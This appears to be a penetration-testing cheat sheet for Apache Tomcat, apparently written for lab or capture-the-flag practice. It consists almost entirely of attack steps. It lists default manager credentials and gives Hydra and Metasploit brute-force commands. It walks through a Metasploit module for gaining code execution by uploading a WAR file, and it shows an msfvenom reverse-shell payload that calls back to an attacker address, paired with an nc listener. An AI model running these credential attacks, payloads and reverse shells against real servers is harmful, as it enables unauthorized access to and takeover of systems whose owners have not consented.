# 🐈 Tomcat
## No Account
### Default Credentials
admin:admin
tomcat:tomcat
admin:
admin:s3cr3t
tomcat:s3cr3t
tomcat:s3cret
admin:tomcat

### Bruteforce
```bash
# metasploit
msf> use auxiliary/scanner/http/tomcat_mgr_login

# hydra
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

### Passwords Backtrace disclosure
/auth.jsp

## With Account
### Manager - RCE
>You will only be able to deploy a **WAR** file if you have enough privileges (roles: admin, manager and manager-script). Those details can be find under tomcat-users.xml usually defined in /usr/share/tomcat9/etc/tomcat-users.xml (it vary between versions)

#### PoC
```bash
# metasploit
use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost <IP>
msf exploit(multi/http/tomcat_mgr_upload) > set rport <port>
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername <username>
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword <password>
msf exploit(multi/http/tomcat_mgr_upload) > exploit

# msfvenom - manually
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.11.0.41 LPORT=8083 -f war -o revshell.war
# upload it to tomcat and access it : /revshell/
# host
nc -lvnp 8083
```
